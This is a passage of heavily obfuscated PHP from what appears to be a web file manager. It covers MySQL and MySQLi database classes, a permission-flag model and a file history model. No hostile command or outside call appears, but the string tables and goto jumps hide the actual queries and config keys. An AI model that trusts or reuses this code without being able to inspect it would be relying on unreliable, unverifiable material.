strtolower($ÔúÙè–ô[$æš«ï‡¦[43]]) == $æš«ï‡¦[44]); } } return $§ú—ë¥ê; } public function getTables($³ª³™ = '') { $µ¯Ú›‡ =& $_SERVER[ÏéâËõ‘]; if (!empty($³ª³™)) { $æÃ™¡Ô = $µ¯Ú›‡[904] . $³ª³™ . $µ¯Ú›‡[905]; } else { $æÃ™¡Ô = $µ¯Ú›‡[906]; } $×ÚÙì¥® = $this->query($æÃ™¡Ô); $Ãœ£ƒÀÕ = array(); foreach ($×ÚÙì¥® as $Öı‹”‡Ø => $Õ®Æ÷÷ç) { $Ãœ£ƒÀÕ[$Öı‹”‡Ø] = current($Õ®Æ÷÷ç); } return $Ãœ£ƒÀÕ; } public function replace($¤ê¶öñ¼, $ĞÎÓî ƒ = array()) { $Öò ÌÛë =& $_SERVER[ÏéâËõ‘]; foreach ($¤ê¶öñ¼ as $ÅÍÒô„¤ => $‹‡íÀÂ) { $º×¬ëš = $this->parseValue($‹‡íÀÂ); if (is_scalar($º×¬ëš)) { $ª°”“©Ş[] = $º×¬ëš; $¡¾©Ü—[] = $this->parseKey($ÅÍÒô„¤); } } $ÊÒ† = $Öò ÌÛë[907] . $this->parseTable($ĞÎÓî ƒ[$Öò ÌÛë[279]]) . $Öò ÌÛë[908] . implode($Öò ÌÛë[50], $¡¾©Ü—) . $Öò ÌÛë[909] . implode($Öò ÌÛë[50], $ª°”“©Ş) . $Öò ÌÛë[910]; return $this->execute($ÊÒ†); } public function insertAll($·Æ“ˆ¨İ, $Í³Ó‚µˆ = array(), $š§‡Ú£¢ = false) { $á¨ñÓÎ¾ =& $_SERVER[ÏéâËõ‘]; if (!is_array($·Æ“ˆ¨İ[0])) { return !1; } $¯åİö¯¤ = array_keys($·Æ“ˆ¨İ[0]); $ë–î‡Ïö = array(); foreach ($·Æ“ˆ¨İ as $‘ò’èµŸ) { $İñşíÆ = array(); foreach ($‘ò’èµŸ as $¿Ùèµ¯Ú => $—ËÊ©Ğ) { $—ËÊ©Ğ = $this->parseValue($—ËÊ©Ğ); if (is_scalar($—ËÊ©Ğ)) { $İñşíÆ[] = $—ËÊ©Ğ; } } $ë–î‡Ïö[] = $á¨ñÓÎ¾[260] . implode($á¨ñÓÎ¾[50], $İñşíÆ) . $á¨ñÓÎ¾[910]; } array_walk($¯åİö¯¤, array($this, $á¨ñÓÎ¾[911])); $Üƒ‚Â“ = ($š§‡Ú£¢ ? $á¨ñÓÎ¾[912] : $á¨ñÓÎ¾[913]) . $á¨ñÓÎ¾[914] . $this->parseTable($Í³Ó‚µˆ[$á¨ñÓÎ¾[279]]) . $á¨ñÓÎ¾[908] . implode($á¨ñÓÎ¾[50], $¯åİö¯¤) . $á¨ñÓÎ¾[915] . implode($á¨ñÓÎ¾[50], $ë–î‡Ïö); return $this->execute($Üƒ‚Â“); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ôı•´» =& $_SERVER[ÏéâËõ‘]; $this->error = mysql_errno() . $Ôı•´»[4] . mysql_error($this->_linkID); if ($Ôı•´»[12] != $this->queryStr) { $this->error .= LNG($Ôı•´»[48]) . $this->queryStr; } think_trace($this->error, $Ôı•´»[12], $Ôı•´»[49]); return $this->error; } public function escapeString($íÌ®àºÙ) { if ($this->_linkID) { return mysql_real_escape_string($íÌ®àºÙ, $this->_linkID); } else { return mysql_escape_string($íÌ®àºÙ); } } public function parseKey(&$‚´Ùö¨Õ, $Ö¿ÆåĞ¿ = true) { $‰Åéß¯î =& $_SERVER[ÏéâËõ‘]; if ($Ö¿ÆåĞ¿) { $‚´Ùö¨Õ = $this->parseKeyCheck($‚´Ùö¨Õ); } if ($‚´Ùö¨Õ != $‰Åéß¯î[188] && !preg_match($‰Åéß¯î[916], $‚´Ùö¨Õ)) { $‚´Ùö¨Õ = $‰Åéß¯î[385] . trim($‚´Ùö¨Õ, $‰Åéß¯î[385]) . $‰Åéß¯î[385]; } return $‚´Ùö¨Õ; } } class DbMysqli extends Db { public function __construct($¨‡ü‹‚Æ = '') { $øì‰ÂÅœ =& $_SERVER[ÏéâËõ‘]; if (!extension_loaded($øì‰ÂÅœ[917])) { think_exception(think_lang($øì‰ÂÅœ[14]) . $øì‰ÂÅœ[918]); } if (!empty($¨‡ü‹‚Æ)) { $this->config = $¨‡ü‹‚Æ; if (empty($this->config[$øì‰ÂÅœ[17]])) { $this->config[$øì‰ÂÅœ[17]] = $øì‰ÂÅœ[12]; } } } public function connect($˜Ë¦éóæ = '', $ÈÍÚ°¢ˆ = 0) { $‰ˆò‹Ö‡ =& $_SERVER[ÏéâËõ‘]; if (!isset($this->linkID[$ÈÍÚ°¢ˆ])) { if (empty($˜Ë¦éóæ)) { $˜Ë¦éóæ = $this->config; } $this->linkID[$ÈÍÚ°¢ˆ] = new mysqli($˜Ë¦éóæ[$‰ˆò‹Ö‡[891]], $˜Ë¦éóæ[$‰ˆò‹Ö‡[893]], $˜Ë¦éóæ[$‰ˆò‹Ö‡[894]], $˜Ë¦éóæ[$‰ˆò‹Ö‡[21]], $˜Ë¦éóæ[$‰ˆò‹Ö‡[892]] ? intval($˜Ë¦éóæ[$‰ˆò‹Ö‡[892]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $Î€¤Ìà’ = $this->linkID[$ÈÍÚ°¢ˆ]->server_version; $this->linkID[$ÈÍÚ°¢ˆ]->query($‰ˆò‹Ö‡[895] . think_config($‰ˆò‹Ö‡[896]) . $‰ˆò‹Ö‡[58]); if ($Î€¤Ìà’ > $‰ˆò‹Ö‡[897]) { $this->linkID[$ÈÍÚ°¢ˆ]->query($‰ˆò‹Ö‡[898]); } $this->connected = !0; if (1 != think_config($‰ˆò‹Ö‡[22])) { unset($this->config); } } return $this->linkID[$ÈÍÚ°¢ˆ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ê˜ëŞ–Š) { $­ŠØ¿±é =& $_SERVER[ÏéâËõ‘]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ê˜ëŞ–Š; if ($this->queryID) { $this->free(); } think_action_status($­ŠØ¿±é[23], 1); think_status($­ŠØ¿±é[24]); $this->queryID = $this->_linkID->query($ê˜ëŞ–Š); if ($this->_linkID->more_results()) { while (($ğ¨š‚ÍÍ = $this->_linkID->next_result()) != NULL) { $ğ¨š‚ÍÍ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ÜÜ»É…Ç) { $¯·±üÅ =& $_SERVER[ÏéâËõ‘]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÜÜ»É…Ç; if ($this->queryID) { $this->free(); } think_action_status($¯·±üÅ[25], 1); think_status($¯·±üÅ[24]); $’È¨ğÖ = $this->_linkID->query($ÜÜ»É…Ç); $this->debug(); if (!1 === $’È¨ğÖ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÔÄ„–Îé = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ÔÄ„–Îé) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¡×­ß‹Á = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¡×­ß‹Á) { $this->error(); return !1; } } return !0; } private function getAll() { $“£İÏ€Á = array(); if ($this->numRows > 0) { for ($Ã—¨Ğä = 0; $Ã—¨Ğä < $this->numRows; $Ã—¨Ğä++) { $“£İÏ€Á[$Ã—¨Ğä] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $“£İÏ€Á; } public function getFields($–’ËÂš) { $şÌ³ëÛ° =& $_SERVER[ÏéâËõ‘]; $É–µÁó = $this->query($şÌ³ëÛ°[902] . $this->parseKey($–’ËÂš)); $‘ªœ…£‡ = array(); if ($É–µÁó) { foreach ($É–µÁó as $Å”ÓõÛ => $ÅÏÅíÄ›) { $‘ªœ…£‡[$ÅÏÅíÄ›[$şÌ³ëÛ°[31]]] = array($şÌ³ëÛ°[32] => $ÅÏÅíÄ›[$şÌ³ëÛ°[31]], $şÌ³ëÛ°[33] => $ÅÏÅíÄ›[$şÌ³ëÛ°[34]], $şÌ³ëÛ°[35] => (bool) ($ÅÏÅíÄ›[$şÌ³ëÛ°[36]] === $şÌ³ëÛ°[12]), $şÌ³ëÛ°[37] => $ÅÏÅíÄ›[$şÌ³ëÛ°[38]], $şÌ³ëÛ°[39] => strtolower($ÅÏÅíÄ›[$şÌ³ëÛ°[40]]) == $şÌ³ëÛ°[41], $şÌ³ëÛ°[42] => strtolower($ÅÏÅíÄ›[$şÌ³ëÛ°[43]]) == $şÌ³ëÛ°[44]); } } return $‘ªœ…£‡; } public function getTables($™Ş‘Ùõ• = '') { $—¦Ì…«– =& $_SERVER[ÏéâËõ‘]; $­êĞ‹î = !empty($™Ş‘Ùõ•) ? $—¦Ì…«–[904] . $™Ş‘Ùõ• . $—¦Ì…«–[905] : $—¦Ì…«–[906]; $¡¤é„Ùş = $this->query($­êĞ‹î); $ë»şïæÂ = array(); if ($¡¤é„Ùş) { foreach ($¡¤é„Ùş as $§Æß¥²ª => $ˆŠŞ«Ç) { $ë»şïæÂ[$§Æß¥²ª] = current($ˆŠŞ«Ç); } } return $ë»şïæÂ; } public function replace($áÓİ÷ì•, $³ñ€Õ³ = array()) { $¹Ù„›Öö =& $_SERVER[ÏéâËõ‘]; foreach ($áÓİ÷ì• as $Š©°¾éŠ => $ÂÆ¼ìÍ–) { $Ì•ĞĞ’ = $this->parseValue($ÂÆ¼ìÍ–); if (is_scalar($Ì•ĞĞ’)) { $½¬¯”õê[] = $Ì•ĞĞ’; $‡ôî‰±[] = $this->parseKey($Š©°¾éŠ); } } $¥ñŸ ¹Ù = $¹Ù„›Öö[907] . $this->parseTable($³ñ€Õ³[$¹Ù„›Öö[279]]) . $¹Ù„›Öö[908] . implode($¹Ù„›Öö[50], $‡ôî‰±) . $¹Ù„›Öö[909] . implode($¹Ù„›Öö[50], $½¬¯”õê) . $¹Ù„›Öö[910]; return $this->execute($¥ñŸ ¹Ù); } public function insertAll($ãˆšË’È, $Î¬‰‡ = array(), $çŸ›…¾Û = false) { $¸Ì÷çà =& $_SERVER[ÏéâËõ‘]; if (!is_array($ãˆšË’È[0])) { return !1; } $¯Ñ™åëÉ = array_keys($ãˆšË’È[0]); $ ¢óê = array(); foreach ($ãˆšË’È as $§Ô ÀĞ) { $Æ•®éÃ = array(); foreach ($§Ô ÀĞ as $õú®‚¯¿ => $å…å’‰—) { $å…å’‰— = $this->parseValue($å…å’‰—); if (is_scalar($å…å’‰—)) { $Æ•®éÃ[] = $å…å’‰—; } } $ ¢óê[] = $¸Ì÷çà[260] . implode($¸Ì÷çà[50], $Æ•®éÃ) . $¸Ì÷çà[910]; } array_walk($¯Ñ™åëÉ, array($this, $¸Ì÷çà[911])); $„ÑÁüÈ‹ = $çŸ›…¾Û ? $¸Ì÷çà[912] : $¸Ì÷çà[913]; $ŠÕÌŠ´ = $„ÑÁüÈ‹ . $¸Ì÷çà[914] . $this->parseTable($Î¬‰‡[$¸Ì÷çà[279]]) . $¸Ì÷çà[908] . implode($¸Ì÷çà[50], $¯Ñ™åëÉ) . $¸Ì÷çà[915] . implode($¸Ì÷çà[50], $ ¢óê); return $this->execute($ŠÕÌŠ´); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $µæœçåÓ =& $_SERVER[ÏéâËõ‘]; $this->error = $this->_linkID->errno . $µæœçåÓ[4] . $this->_linkID->error; if ($µæœçåÓ[12] != $this->queryStr) { $this->error .= LNG($µæœçåÓ[48]) . $this->queryStr; } think_trace($this->error, $µæœçåÓ[12], $µæœçåÓ[49]); return $this->error; } public function escapeString($¡õ í±Ø) { if ($this->_linkID) { return $this->_linkID->real_escape_string($¡õ í±Ø); } else { return addslashes($¡õ í±Ø); } } public function parseKey(&$¡Ë¶ä¨‰, $Ş³²—áâ = true) { $Åª˜ë® =& $_SERVER[ÏéâËõ‘]; if ($Ş³²—áâ) { $¡Ë¶ä¨‰ = $this->parseKeyCheck($¡Ë¶ä¨‰); } if ($¡Ë¶ä¨‰ != $Åª˜ë®[188] && !preg_match($Åª˜ë®[916], $¡Ë¶ä¨‰)) { $¡Ë¶ä¨‰ = $Åª˜ë®[385] . trim($¡Ë¶ä¨‰, $Åª˜ë®[385]) . $Åª˜ë®[385]; } return $¡Ë¶ä¨‰; } } goto d‡ùà«àò¬; d½ÎÛ¾±: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $Õ†ì¬œĞ =& $_SERVER[ÏéâËõ‘]; $ç¸ÙÍğÄ = array(array($Õ†ì¬œĞ[420] => LNG($Õ†ì¬œĞ[1835]), $Õ†ì¬œĞ[1836] => $Õ†ì¬œĞ[1837], $Õ†ì¬œĞ[1838] => 1, $Õ†ì¬œĞ[1839] => 1, $Õ†ì¬œĞ[1840] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Õ†ì¬œĞ[420] => LNG($Õ†ì¬œĞ[1841]), $Õ†ì¬œĞ[1836] => $Õ†ì¬œĞ[1842], $Õ†ì¬œĞ[1838] => 2, $Õ†ì¬œĞ[1839] => 1, $Õ†ì¬œĞ[1840] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Õ†ì¬œĞ[420] => LNG($Õ†ì¬œĞ[1843]), $Õ†ì¬œĞ[1836] => $Õ†ì¬œĞ[1844], $Õ†ì¬œĞ[1838] => 3, $Õ†ì¬œĞ[1839] => 1, $Õ†ì¬œĞ[1840] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Õ†ì¬œĞ[420] => LNG($Õ†ì¬œĞ[1845]), $Õ†ì¬œĞ[1836] => $Õ†ì¬œĞ[1846], $Õ†ì¬œĞ[1838] => 4, $Õ†ì¬œĞ[1839] => 1, $Õ†ì¬œĞ[1840] => self::AUTH_SHOW | self::AUTH_VIEW), array($Õ†ì¬œĞ[420] => LNG($Õ†ì¬œĞ[1847]), $Õ†ì¬œĞ[1836] => $Õ†ì¬œĞ[1848], $Õ†ì¬œĞ[1838] => 5, $Õ†ì¬œĞ[1839] => 1, $Õ†ì¬œĞ[1840] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Õ†ì¬œĞ[420] => LNG($Õ†ì¬œĞ[1849]), $Õ†ì¬œĞ[1836] => $Õ†ì¬œĞ[1850], $Õ†ì¬œĞ[1838] => 6, $Õ†ì¬œĞ[1839] => 1, $Õ†ì¬œĞ[1840] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Õ†ì¬œĞ[420] => LNG($Õ†ì¬œĞ[1851]), $Õ†ì¬œĞ[1836] => $Õ†ì¬œĞ[1852], $Õ†ì¬œĞ[1838] => 7, $Õ†ì¬œĞ[1839] => 1, $Õ†ì¬œĞ[1840] => 0)); return $ç¸ÙÍğÄ; } public static function authCheck($˜·ÓÆˆÜ, $ ñÇÍİ‡) { $€ŠÖ”µ™ =& $_SERVER[ÏéâËõ‘]; $˜·ÓÆˆÜ = intval($˜·ÓÆˆÜ); if ($GLOBALS[$€ŠÖ”µ™[503]] && $GLOBALS[$€ŠÖ”µ™[6]][$€ŠÖ”µ™[1853]]) { return !0; } if ($˜·ÓÆˆÜ <= 0) { return !1; } if (($˜·ÓÆˆÜ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($˜·ÓÆˆÜ & $ ñÇÍİ‡); } public static function authCheckShow($¿úª„œÏ) { return self::authCheck($¿úª„œÏ, self::AUTH_SHOW); } public static function authCheckView($ÈÜíìêÅ) { return self::authCheck($ÈÜíìêÅ, self::AUTH_VIEW); } public static function authCheckDownload($à¶”ÄÏÌ) { return self::authCheck($à¶”ÄÏÌ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($²Ã­‚§) { return self::authCheck($²Ã­‚§, self::AUTH_UPLOAD); } public static function authCheckEdit($İğ¿ş×) { return self::authCheck($İğ¿ş×, self::AUTH_EDIT); } public static function authCheckRemove($§‰¸¥æ) { return self::authCheck($§‰¸¥æ, self::AUTH_REMOVE); } public static function authCheckShare($Ş¹›àÈ‚) { return self::authCheck($Ş¹›àÈ‚, self::AUTH_SHARE); } public static function authCheckComment($¦—öÌÃë) { return self::authCheck($¦—öÌÃë, self::AUTH_COMMENT); } public static function authCheckEvent($®º÷†Ã) { return self::authCheck($®º÷†Ã, self::AUTH_EVENT); } public static function authCheckRoot($á‚¦§ì) { return self::authCheck($á‚¦§ì, self::AUTH_ROOT); } public static function authCheckAction($ÇÀ¶ÁŸ, $Ë­§•—•) { $×óÓ°¼ï =& $_SERVER[ÏéâËõ‘]; $¶ñÄØè = array($×óÓ°¼ï[1854] => self::AUTH_VIEW, $×óÓ°¼ï[1204] => self::AUTH_DOWNLOAD, $×óÓ°¼ï[107] => self::AUTH_UPLOAD, $×óÓ°¼ï[1804] => self::AUTH_EDIT, $×óÓ°¼ï[1803] => self::AUTH_REMOVE, $×óÓ°¼ï[1814] => self::AUTH_SHARE, $×óÓ°¼ï[354] => self::AUTH_COMMENT, $×óÓ°¼ï[1650] => self::AUTH_EVENT, $×óÓ°¼ï[1855] => self::AUTH_ROOT); if (!isset($¶ñÄØè[$Ë­§•—•])) { return; } $Û‚Šİ ¹ = $¶ñÄØè[$Ë­§•—•]; $ÇÀ¶ÁŸ = intval($ÇÀ¶ÁŸ); if ($ÇÀ¶ÁŸ <= 0) { return !1; } if (($ÇÀ¶ÁŸ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ÇÀ¶ÁŸ & $Û‚Šİ ¹); } public static function authDisable($ı®ëµğø, $æ§ğ¾“ã) { if (intval($ı®ëµğø) <= 0) { return 0; } return intval($ı®ëµğø) & ~$æ§ğ¾“ã; } public $optionType = "\x53\x79\163\164\x65\155\56\163\157\x75\x72\143\145\101\165\x74\150\x4c\x69\x73\x74"; public $field = array("\156\x61\x6d\x65", "\141\165\164\x68", "\x6c\x61\142\x65\x6c", "\x64\151\x73\160\154\x61\171", "\163\x79\163\164\x65\x6d", "\x73\157\162\x74"); public function initData() { $ŠÛ¶× = $this->authDefault(); foreach ($ŠÛ¶× as $²Ãç¤¤Ö) { $this->add($²Ãç¤¤Ö); } } public function findAuth($È¶Å×„•, $òŒÆúá) { $²†ÙßÌ¶ =& $_SERVER[ÏéâËõ‘]; $šúÔãúÉ = parent::listData(); foreach ($šúÔãúÉ as $¸·‡˜Š) { $ü÷ËÍ¯¬ = intval($¸·‡˜Š[$²†ÙßÌ¶[413]]); if ($ü÷ËÍ¯¬ <= 0 || $¸·‡˜Š[$²†ÙßÌ¶[1856]] == 0) { continue; } if (($ü÷ËÍ¯¬ & $È¶Å×„•) != $È¶Å×„•) { continue; } if (($ü÷ËÍ¯¬ & $òŒÆúá) != 0) { continue; } return $¸·‡˜Š[$²†ÙßÌ¶[399]]; } return !1; } public function findAuthReadOnly() { $Å“ı¬É = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $¸äÄÇ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($Å“ı¬É, $¸äÄÇ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ËÜÆŠ¬ =& $_SERVER[ÏéâËõ‘]; $Ú‚¼ê‡Ë = parent::listData(); $ÑÄËÔ = !1; foreach ($Ú‚¼ê‡Ë as $òãùæ Ş) { if ($òãùæ Ş[$ËÜÆŠ¬[413]] <= 0 || $òãùæ Ş[$ËÜÆŠ¬[1856]] == $ËÜÆŠ¬[197]) { continue; } if (!$ÑÄËÔ) { $ÑÄËÔ = $òãùæ Ş; continue; } if ($ÑÄËÔ[$ËÜÆŠ¬[413]] > $òãùæ Ş[$ËÜÆŠ¬[413]]) { $ÑÄËÔ = $òãùæ Ş; } } return $ÑÄËÔ ? $ÑÄËÔ[$ËÜÆŠ¬[399]] : $ËÜÆŠ¬[12]; } public function listData($õÀ›è“ƒ = false, $çÛœƒŸ¥ = "\163\157\162\164", $†è‚¤íÔ = false) { return parent::listData($õÀ›è“ƒ, $çÛœƒŸ¥, $†è‚¤íÔ); } public function update($§è¬™Ö, $‰Â¸¾ ü) { $¹ë… È =& $_SERVER[ÏéâËõ‘]; $Ü¬â‰¶Ç = parent::listData($§è¬™Ö); $Ù­©‹’õ = $this->findByName($‰Â¸¾ ü[$¹ë… È[32]]); if (!$Ü¬â‰¶Ç || $Ù­©‹’õ && $Ù­©‹’õ[$¹ë… È[399]] != $Ü¬â‰¶Ç[$¹ë… È[399]]) { return !1; } $this->filterAuth($‰Â¸¾ ü[$¹ë… È[413]]); return parent::update($§è¬™Ö, $‰Â¸¾ ü); } public function remove($³ß¯£‡ì) { $‡ó©ĞÀ© = parent::listData($³ß¯£‡ì); if (!$‡ó©ĞÀ© || $‡ó©ĞÀ©[$_SERVER[ÏéâËõ‘][1281]]) { return !1; } return parent::remove($³ß¯£‡ì); } public function add($÷»­¢Ì = array()) { $ƒ«ğã† =& $_SERVER[ÏéâËõ‘]; if ($this->findByName($÷»­¢Ì[$ƒ«ğã†[32]])) { return !1; } $ÂûÚÖŒº = array($ƒ«ğã†[32] => $ƒ«ğã†[12], $ƒ«ğã†[413] => 1, $ƒ«ğã†[1857] => $ƒ«ğã†[1844], $ƒ«ğã†[1856] => 1, $ƒ«ğã†[1281] => 0, $ƒ«ğã†[1858] => 0); $÷»­¢Ì = array_merge($ÂûÚÖŒº, $÷»­¢Ì); $÷»­¢Ì[$ƒ«ğã†[1858]] = $this->getSort(); $this->filterAuth($÷»­¢Ì[$ƒ«ğã†[413]]); return parent::insert($÷»­¢Ì); } private function getSort() { $™­É™ìƒ =& $_SERVER[ÏéâËõ‘]; $ş°†Ìí‹ = parent::listData(); $Ûªôş¤› = array_to_keyvalue($ş°†Ìí‹, $™­É™ìƒ[12], $™­É™ìƒ[1858]); return empty($Ûªôş¤›) ? 0 : max($Ûªôş¤›) + 1; } private function filterAuth(&$¤î‡Ëƒ¸) { if (!$¤î‡Ëƒ¸) { return; } $¬ªĞ½…» = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $’°ŒÌ¬ï = array(); foreach ($¬ªĞ½…» as $Ô‚¨©¶‚) { if ($¤î‡Ëƒ¸ & $Ô‚¨©¶‚) { $’°ŒÌ¬ï[] = $Ô‚¨©¶‚; } } if (in_array(self::AUTH_ROOT, $’°ŒÌ¬ï)) { $¤î‡Ëƒ¸ = array_sum($¬ªĞ½…»); return; } $ÁåÃ§· = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($’°ŒÌ¬ï as $Ô‚¨©¶‚) { if (isset($ÁåÃ§·[$Ô‚¨©¶‚])) { $’°ŒÌ¬ï = array_merge($’°ŒÌ¬ï, $ÁåÃ§·[$Ô‚¨©¶‚]); } } $’°ŒÌ¬ï[] = self::AUTH_SHOW; $¤î‡Ëƒ¸ = array_sum(array_unique($’°ŒÌ¬ï)); } public function sort($°òãş÷Æ, $åùı¿Ñ‹) { return parent::update($°òãş÷Æ, $åùı¿Ñ‹); } } $_file = $_SERVER[$_SERVER[ÏéâËõ‘][865]]; $_size = $_SERVER[ÏéâËõ‘][881]; goto e‘ƒ»çğ…‡; B¡Õƒ„‰‚: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\165\162\x63\145\137\x68\151\x73\x74\157\x72\x79"; public function historyCount($íµ˜­€Å) { $ôÆ Îæô =& $_SERVER[ÏéâËõ‘]; if (!$íµ˜­€Å) { return array(); } if (is_string($íµ˜­€Å) || is_int($íµ˜­€Å)) { $íµ˜­€Å = array($íµ˜­€Å); } $â¾ÖÈÃ = array($ôÆ Îæô[402], $ôÆ Îæô[1867] => $ôÆ Îæô[500]); $éºÜçéë = array($ôÆ Îæô[402] => array($ôÆ Îæô[7], $íµ˜­€Å)); $Õ±€±— = $this->field($â¾ÖÈÃ)->where($éºÜçéë)->group($ôÆ Îæô[402])->select(); return array_to_keyvalue($Õ±€±—, $ôÆ Îæô[402], $ôÆ Îæô[500]); } public function addHistory($¬Â¤Ëâò, $‘˜–Ä± = '') { $‚Íî¼†— =& $_SERVER[ÏéâËõ‘]; $ö¿ßıò¦ = array($‚Íî¼†—[417] => $¬Â¤Ëâò[$‚Íî¼†—[402]], $‚Íî¼†—[1653] => isset($¬Â¤Ëâò[$‚Íî¼†—[456]]) ? $¬Â¤Ëâò[$‚Íî¼†—[456]] : $¬Â¤Ëâò[$‚Íî¼†—[454]], $‚Íî¼†—[469] => $¬Â¤Ëâò[$‚Íî¼†—[468]], $‚Íî¼†—[585] => $¬Â¤Ëâò[$‚Íî¼†—[76]], $‚Íî¼†—[2073] => $‘˜–Ä±); if ($GLOBALS[$‚Íî¼†—[6]][$‚Íî¼†—[89]][$‚Íî¼†—[1214]] >= 1) { $this->historyAutoClear($ö¿ßıò¦[$‚Íî¼†—[402]]); $this->add($ö¿ßıò¦); } Hook::trigger($‚Íî¼†—[2074], $ö¿ßıò¦); Model($‚Íî¼†—[2075])->eventFileEdit($¬Â¤Ëâò[$‚Íî¼†—[402]]); } private function historyAutoClear($Ø¡š¬¸¿) { $Â°â¦¶ =& $_SERVER[ÏéâËõ‘]; $È°¯à = Model($Â°â¦¶[772])->get($Â°â¦¶[1236]); $ñµ¾€£Â = $GLOBALS[$Â°â¦¶[6]][$Â°â¦¶[89]][$Â°â¦¶[1214]]; $ÏîÚÜÍÌ = $È°¯à == $Â°â¦¶[1237] ? min(5, $ñµ¾€£Â) : $ñµ¾€£Â; $ÏîÚÜÍÌ = $ÏîÚÜÍÌ <= 0 ? 0 : $ÏîÚÜÍÌ - 1; if ($ÏîÚÜÍÌ >= 500) { return; } $ŞöãíÓ¤ = array($Â°â¦¶[417] => $Ø¡š¬¸¿); $ ÒÓìƒÇ = $this->field($Â°â¦¶[2076])->where($ŞöãíÓ¤)->order($Â°â¦¶[2070])->select(); if (!$ ÒÓìƒÇ || $ÏîÚÜÍÌ >= count($ ÒÓìƒÇ)) { return; } $Ò«££Š§ = array_to_keyvalue($ ÒÓìƒÇ, $Â°â¦¶[12], $Â°â¦¶[399]); $Ò«££Š§ = array_slice($Ò«££Š§, $ÏîÚÜÍÌ); $ÍÔŸ¡íÛ = array_to_keyvalue($ ÒÓìƒÇ, $Â°â¦¶[12], $Â°â¦¶[468]); $ÍÔŸ¡íÛ = array_slice($ÍÔŸ¡íÛ, $ÏîÚÜÍÌ); if (!$Ò«££Š§ || !$ÍÔŸ¡íÛ) { return; } $ŞöãíÓ¤ = array($Â°â¦¶[419] => array($Â°â¦¶[7], $Ò«££Š§)); $this->where($ŞöãíÓ¤)->delete(); Model($Â°â¦¶[471])->remove($ÍÔŸ¡íÛ); } public function listData($ÓÜ™ää«) { $Ğü¶èµ‘ =& $_SERVER[ÏéâËõ‘]; $Éõö×î = array($Ğü¶èµ‘[417] => $ÓÜ™ää«); $øğ¹éñ = $Ğü¶èµ‘[2077]; $½¼µ˜ÀØ = $this->field($øğ¹éñ)->where($Éõö×î)->order($Ğü¶èµ‘[2070])->selectPage(); $this->_listAppendUser($½¼µ˜ÀØ[$Ğü¶èµ‘[369]]); $Ş§‡×‚­ = Model($Ğü¶èµ‘[772])->get($Ğü¶èµ‘[1236]); $‘ÏêşÔ = 5; if ($Ş§‡×‚­ == $Ğü¶èµ‘[1237]) { $½¼µ˜ÀØ[$Ğü¶èµ‘[369]] = array_slice($½¼µ˜ÀØ[$Ğü¶èµ‘[369]], 0, $‘ÏêşÔ); $½¼µ˜ÀØ[$Ğü¶èµ‘[366]] = array($Ğü¶èµ‘[2078] => 1, $Ğü¶èµ‘[2079] => 20, $Ğü¶èµ‘[2080] => 1, $Ğü¶èµ‘[2081] => 